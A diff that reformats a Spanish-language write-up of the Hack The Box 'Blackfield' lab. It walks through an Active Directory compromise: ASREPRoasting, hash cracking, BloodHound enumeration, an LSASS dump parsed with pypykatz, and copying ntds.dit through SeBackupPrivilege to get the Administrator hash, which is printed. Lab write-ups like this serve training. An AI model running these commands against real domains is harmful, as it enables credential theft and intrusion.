@@ -45,7 +45,7 @@ A través de la herramienta WhichSystem puedo saber que me enfrento a una máqui
 
 Escaneamos puertos con nmap como de costumbre
 
-```nmap
+```bash
 PORT     STATE SERVICE
 53/tcp   open  domain
 88/tcp   open  kerberos-sec
@@ -59,7 +59,7 @@ PORT     STATE SERVICE
 
 Tenemos un listado amplio de puertos, de los cuales procedo a obtener más información con un escaneo de servicios y versiones.
 
-```nmap
+```bash
 PORT     STATE SERVICE       VERSION
 53/tcp   open  domain        Simple DNS Plus
 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-27 07:59:15Z)
@@ -87,7 +87,6 @@ Host script results:
 
 A continuación procedo a emumerar el AD.
 
-
 # Explotación [#](explotacion) {#explotación}
 
 A través de rpcclient usando una null session intento enumerar usuarios.
@@ -110,7 +109,9 @@ Encuentro una lista grande de usuarios, asique eso me da que pensar... Podría c
 
 Paso los nombres de usuario a un archivo y lanzo el ataque ASREPRoast
 
-> `impacket-GetNPUsers -usersfile /home/elc4br4/HTB/Blackfield/users.txt -outputfile hashes.hash BLACKFIELD.local/`
+```bash
+impacket-GetNPUsers -usersfile /home/elc4br4/HTB/Blackfield/users.txt -outputfile hashes.hash BLACKFIELD.local/
+```
 
 Y abro el archivo que se me genera y encuentro un hash del usuario `support`
 
@@ -118,7 +119,9 @@ Y abro el archivo que se me genera y encuentro un hash del usuario `support`
 
 A continuación voy a craquearlo usando hascat
 
-> `hashcat -m 18200 hashes.hash /usr/share/wordlists/rockyou.txt --force`
+```bash
+hashcat -m 18200 hashes.hash /usr/share/wordlists/rockyou.txt --force
+```
 
 ![](/assets/images/HTB/Blackfield-HackTheBox/hash-cracked.webp)
 
@@ -136,7 +139,7 @@ Hay uno que me llama la atención, el usuario audit2020, ya que había uno de lo
 
 Además del usuario audit seguí enumerando a través de la herramienta ldap search y encontré el nombre del DC (Domain Controller)
 
-```ldapsearch
+```bash
 ldapsearch -h 10.10.10.192 -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' > ldapsearch
 
 # DC01, Domain Controllers, BLACKFIELD.local
@@ -151,10 +154,11 @@ dNSHostName: DC01.BLACKFIELD.local
 
 En este punto estoy algo perdido... ya que solo tengo un usuario, asique me decido a lanzar bloodhound para ver que puedo hacer.
 
-`python bloodhound.py -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192`
+```bash
+python bloodhound.py -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192
+```
 
 Se generan varios archivos de extensión .json que analizaré a continuación.
-
 
 ![](/assets/images/HTB/Blackfield-HackTheBox/Bloodhound1.webp)
 
@@ -170,7 +174,7 @@ A través de rpcclient es posible cambiar la contraseña.
 
 Ahora que ya tenemos credenciales voy a probarlas com cme para ver si son válidas en SMB.
 
-```cme
+```bash
 ❯ crackmapexec smb 10.10.10.192 -u audit2020 -p 'elc4br4!!!'
 SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
 SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:elc4br4!!! 
@@ -178,7 +182,7 @@ SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit20
 
 Son válidas con SMB, ¿pero y con WinRM?
 
-```cme
+```bash
 ❯ crackmapexec winrm 10.10.10.192 -u audit2020 -p 'elc4br4!!!'
 WINRM       10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
 WINRM       10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
@@ -188,7 +192,7 @@ En esta ocasión no hubo suerte con Winrm
 
 Pero recordemos que tenemos el recurso forensic en SMB y ya podemos acceder con las credenciales anteriores.
 
-```smb
+```bash
 ❯ smbclient -U "audit2020" //10.10.10.192/forensic
 Enter WORKGROUP\audit2020's password: 
 Try "help" to get a list of possible commands.
@@ -204,7 +208,7 @@ smb: \> ls
 
 En la ruta commands_output encuentro varios archivos.
 
-```smb
+```bash
 smb: \commands_output\> ls
   .                                   D        0  Sun Feb 23 19:14:37 2020
   ..                                  D        0  Sun Feb 23 19:14:37 2020
@@ -229,7 +233,7 @@ Miro todos los archivos y en el archivo `domain_admins.txt` encuentro un usuario
 
 Sigo buscando y en la carpeta memory_analysis encuentro estos archivos .zip
 
-```smb
+```bash
 smb: \memory_analysis\> ls
   .                                   D        0  Thu May 28 22:28:33 2020
   ..                                  D        0  Thu May 28 22:28:33 2020
@@ -267,7 +271,7 @@ Es un archivo Mini DuMP, en este caso lo analizaríamos con Mimikatz ya que es c
 
 `pip3 install pypykatz`
 
-`❯ pypykatz lsa minidump lsass.DMP`
+`pypykatz lsa minidump lsass.DMP`
 
 Me reporta mucha información, entre ella el hash del usuario svc_backup con el que compruebo si puedo acceder al sistema a través de Winrm.
 
@@ -298,17 +302,17 @@ Busco algo de información sobre aquellos privilegios que tiene el usuario svc_b
 
 En el artículo encontramos 2 métodos, yo relizaré el método 1.
 
-> Creamos un archivo con extensión.dsh con el siguiente contenido.
+1. Creamos un archivo con extensión.dsh con el siguiente contenido.
 
 ![](/assets/images/HTB/Blackfield-HackTheBox/elc4br4dsh.webp)
 
-> Ejecutamos el comando `unix2dos raj.dsh` para convertir el archivo a formato DOS
+2. Ejecutamos el comando `unix2dos raj.dsh` para convertir el archivo a formato DOS
 
 Dentro de la sesión Winrm ejecutamos estos comandos.
 
-Subimos el archivo elc4br4.dsh
+3. Subimos el archivo elc4br4.dsh
 
-```winrm
+```bash
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> upload /home/elc4br4/HTB/Blackfield/elc4br4.dsh
 Info: Uploading /home/elc4br4/HTB/Blackfield/elc4br4.dsh to C:\Users\Administrator\Desktop\elc4br4.dsh
 
@@ -318,9 +322,9 @@ Data: 112 bytes of 112 bytes copied
 Info: Upload successful!
 ```
 
-Una vez subido ejecutamos estos comandos:
+4. Una vez subido ejecutamos estos comandos:
 
-```winrm
+```bash
 *Evil-WinRM* PS C:\ProgramData> diskshadow /s elc4br4.dsh
 Microsoft DiskShadow version 1.0
 Copyright (C) 2013 Microsoft Corporation
@@ -352,7 +356,7 @@ Number of shadow copies listed: 1
 The  drive letter is already in use.
 ```
 
-```winrm
+```bash
 *Evil-WinRM* PS C:\ProgramData> robocopy /b z:\windows\ntds . ntds.dit
 
 -------------------------------------------------------------------------------
@@ -381,7 +385,7 @@ The  drive letter is already in use.
    Ended : Tuesday, September 27, 2022 1:04:39 PM
 ```
 
-```winrm
+```bash
 reg save hklm\system C:\ProgramData\system
 ```
 Y se nos copiará en el directorio un archivo llamado system.
@@ -390,13 +394,15 @@ A continuación descargamos el archivo system y ntds.dit con el comando download
 
 Una vez descargado podemos realizar el volcado de hashes de todos los usuarios del sistema, gracias a los archivos system y ntds.dit
 
-> A través de impacket-secretsdump.py
+A través de impacket-secretsdump.py
 
 ![](/assets/images/HTB/Blackfield-HackTheBox/hashes.webp)
 
 Ahora ya tenemos el hash del usuario administrador.
 
-> `Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::`
+```bash
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+```
 
 Y ya podemos loguearnos como administrador a través de winrm.
 
